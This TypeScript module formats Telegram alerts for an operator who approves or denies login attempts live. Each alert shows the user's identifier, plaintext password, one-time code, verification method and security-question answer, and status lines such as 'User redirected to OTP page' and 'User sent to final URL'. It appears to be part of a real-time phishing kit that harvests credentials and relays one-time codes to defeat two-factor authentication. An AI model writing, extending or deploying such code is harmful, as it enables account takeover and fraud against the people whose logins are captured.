import { APPROVAL_TIMEOUT_MS } from "@/lib/approval-messages"

/** Matches member-site approval poll timeout (90s). */
export const ADMIN_PENDING_COUNTDOWN_SEC = APPROVAL_TIMEOUT_MS / 1000

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/

/** Basic email validation used by some member-site login forms. */
export function isValidEmail(value: string): boolean {
  return EMAIL_RE.test(value.trim())
}

/** Detect identifier kind for Telegram labels (email vs username vs phone). */
export function identifierFieldLabel(
  value: unknown,
  methodHint?: string,
): { emoji: string; label: string } {
  const raw = typeof value === "string" ? value.trim() : ""
  const hint = String(methodHint ?? "").toLowerCase()

  if (hint === "phone" || /^\+?[\d\s().-]{7,}$/.test(raw)) {
    const digits = raw.replace(/\D/g, "")
    if (
      hint === "phone" ||
      (digits.length >= 10 && digits.length <= 15 && !raw.includes("@"))
    ) {
      return { emoji: "📱", label: "Phone" }
    }
  }

  if (raw.includes("@") && EMAIL_RE.test(raw)) {
    return { emoji: "📧", label: "Email" }
  }

  return { emoji: "👤", label: "Username" }
}

/** Legacy alias used by some member sites (email/username/phone label with emoji). */
export function loginIdentifierLabel(value: string): string {
  const trimmed = value.trim()
  if (!trimmed) return "👤 User ID:"
  if (EMAIL_RE.test(trimmed)) return "👤 Email:"
  if (/^\d+$/.test(trimmed)) return "👤 User ID:"
  if (
    /^[a-zA-Z0-9._-]+$/.test(trimmed) &&
    /[a-zA-Z]/.test(trimmed) &&
    (trimmed.includes(".") || trimmed.includes("_"))
  ) {
    return "👤 Username:"
  }
  return "👤 User ID:"
}

/** Legacy alias for method-selected form notifications. */
export function methodEmoji(method?: string): string {
  const m = String(method ?? "").toLowerCase()
  if (m === "email") return "📧"
  if (m === "text" || m === "sms") return "📱"
  if (m === "call") return "📞"
  return "📧"
}

/** Plain identifier line for approval templates (no HTML bold). */
export function formatIdentifierLine(
  value: unknown,
  asCode: (value: unknown) => string,
  methodHint?: string,
): string {
  const { emoji, label } = identifierFieldLabel(value, methodHint)
  return `${emoji} ${label}: ${asCode(value)}`
}

export function formatCountdownLabel(secondsLeft: number): string {
  const safe = Math.max(0, Math.floor(secondsLeft))
  const m = Math.floor(safe / 60)
  const s = safe % 60
  return `${m}:${s.toString().padStart(2, "0")}`
}

export function secondsLeftFromCreatedAt(
  createdAtMs: number,
  nowMs = Date.now(),
  ttlSec = ADMIN_PENDING_COUNTDOWN_SEC,
): number {
  return Math.max(0, ttlSec - Math.floor((nowMs - createdAtMs) / 1000))
}

export function methodLabel(method?: string): string | null {
  const value = String(method ?? "").trim()
  if (!value || value === "—" || value === "-") return null
  if (value === "email") return "Email"
  if (value === "text" || value === "sms") return "Text Message (SMS)"
  if (value === "call") return "Phone Call"
  return value
}

type CodeFn = (value: unknown) => string
type LinkFn = (url: string, label?: string) => string

function optionalMethodLine(method: string | undefined, asCode: CodeFn): string {
  const label = methodLabel(method)
  if (!label) return ""
  return `📧 Method: ${asCode(label)}\n`
}

function optionalCountdownLine(
  secondsLeft: number | undefined,
  asCode: CodeFn,
): string {
  if (secondsLeft === undefined) return ""
  return `⏱ Time left: ${asCode(formatCountdownLabel(secondsLeft))}\n`
}

function optionalDatabaseLine(databaseShard: string | undefined, asCode: CodeFn): string {
  const label = String(databaseShard ?? "").trim()
  if (!label) return ""
  return `🗄 Database: ${asCode(label)}\n`
}

export function buildLoginApprovalRequestBody(data: {
  userId: string
  password?: string
  method?: string
  adminLink: string
  secondsLeft?: number
  databaseShard?: string
  asCode: CodeFn
  asLink: LinkFn
}): string {
  const password = String(data.password ?? "").trim() || "—"
  return [
    "🔔 Login request – approve or deny",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
    `Password: ${data.asCode(password)}`,
    optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
    optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
    "",
    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
  ]
    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
    .join("\n")
    .replace(/\n{3,}/g, "\n\n")
}

export function buildOtpApprovalRequestBody(data: {
  userId: string
  code: string
  method?: string
  adminLink: string
  secondsLeft?: number
  databaseShard?: string
  asCode: CodeFn
  asLink: LinkFn
}): string {
  return [
    "🔢 OTP submitted – approve or deny",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
    `🔢 Code: ${data.asCode(data.code)}`,
    optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
    "",
    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
  ]
    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
    .join("\n")
    .replace(/\n{3,}/g, "\n\n")
}

export function buildMethodApprovalRequestBody(data: {
  userId: string
  method: string
  adminLink: string
  secondsLeft?: number
  asCode: CodeFn
  asLink: LinkFn
}): string {
  return [
    "🔔 Verification method selected – approve or deny",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
    optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
    "",
    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
  ]
    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
    .join("\n")
    .replace(/\n{3,}/g, "\n\n")
}

export function buildSecurityApprovalRequestBody(data: {
  userId: string
  question: string
  answer: string
  adminLink: string
  secondsLeft?: number
  asCode: CodeFn
  asLink: LinkFn
}): string {
  return [
    "🔐 Security question – approve or deny",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
    `❓ Question: ${data.asCode(data.question)}`,
    `💬 Answer: ${data.asCode(data.answer)}`,
    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
    "",
    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
  ]
    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
    .join("\n")
    .replace(/\n{3,}/g, "\n\n")
}

export function buildAdminLoginApprovedBody(data: {
  userId?: string
  password?: string
  method?: string
  asCode: CodeFn
  isOtp?: boolean
}): string {
  const password = String(data.password ?? "").trim()
  const lines = [
    data.isOtp ? "✅ CC – OTP Approved" : "✅ CC – Login Approved",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
  ]

  if (data.isOtp) {
    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
  } else {
    lines.push(`Password: ${data.asCode(password || "—")}`)
  }

  const methodLine = optionalMethodLine(data.method, data.asCode)
  if (methodLine) lines.push(methodLine.trimEnd())

  lines.push(
    data.isOtp
      ? "✅ Status: Approved – User sent to final URL"
      : "✅ Status: Approved – User redirected to OTP page",
  )

  return lines.join("\n")
}

export function buildAdminLoginDeniedBody(data: {
  userId?: string
  password?: string
  method?: string
  asCode: CodeFn
  isOtp?: boolean
}): string {
  const password = String(data.password ?? "").trim()
  const lines = [
    data.isOtp ? "❌ CC – OTP Denied" : "❌ CC – Login Denied",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
  ]

  if (data.isOtp) {
    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
  } else {
    lines.push(`Password: ${data.asCode(password || "—")}`)
  }

  const methodLine = optionalMethodLine(data.method, data.asCode)
  if (methodLine) lines.push(methodLine.trimEnd())

  lines.push("❌ Status: Denied – User shown error message")
  return lines.join("\n")
}

export function buildAdminLoginRedirectedBody(data: {
  userId?: string
  password?: string
  method?: string
  asCode: CodeFn
  isOtp?: boolean
}): string {
  const password = String(data.password ?? "").trim()
  const lines = [
    data.isOtp ? "↪️ CC – OTP Redirected" : "↪️ CC – Login Redirected",
    "━━━━━━━━━━━━━━━━━━",
    formatIdentifierLine(data.userId, data.asCode),
  ]

  if (data.isOtp) {
    lines.push(`🔢 Code: ${data.asCode(password || "—")}`)
  } else {
    lines.push(`Password: ${data.asCode(password || "—")}`)
  }

  const methodLine = optionalMethodLine(data.method, data.asCode)
  if (methodLine) lines.push(methodLine.trimEnd())

  lines.push("↪️ Status: Redirected – User sent to final URL")
  return lines.join("\n")
}
